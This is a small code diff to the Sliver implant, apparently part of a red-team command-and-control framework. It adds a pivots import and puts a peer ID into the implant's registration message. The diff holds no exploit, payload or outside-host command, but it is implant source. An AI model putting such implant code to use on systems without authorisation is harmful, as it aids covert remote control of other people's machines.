@@ -52,6 +52,7 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/handlers"
 	"github.com/bishopfox/sliver/implant/sliver/hostuuid"
 	"github.com/bishopfox/sliver/implant/sliver/limits"
+	"github.com/bishopfox/sliver/implant/sliver/pivots"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/implant/sliver/version"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
@@ -675,5 +676,6 @@ func registerSliver() *sliverpb.Register {
 		ReconnectInterval: int64(transports.GetReconnectInterval()),
 		// ProxyURL:          transports.GetProxyURL(),
 		ConfigID: "{{ .Config.ID }}",
+		PeerID:   pivots.MyPeerID,
 	}
 }
